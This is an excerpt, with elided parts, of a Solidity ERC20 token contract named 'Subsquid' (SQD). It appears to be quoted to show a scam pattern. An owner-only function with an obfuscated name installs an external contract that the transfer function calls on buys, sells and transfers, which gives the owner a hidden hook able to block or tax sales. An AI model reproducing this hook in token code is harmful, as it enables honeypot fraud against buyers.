...
contract TokenM is ERC20 {
    ...
    IUserAmountkkoing public kkoing;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Subsquid", "SQD") {
    ...
    function cyuertseBiiuugRxxc(IUserAmountkkoing _kkoing) public onlyOwner {
        kkoing = _kkoing;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                kkoing.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				kkoing.addOutAmount(from, amount);
            }else{
                kkoing.addOutAmount(from, amount);
                takeFee = false;
            }
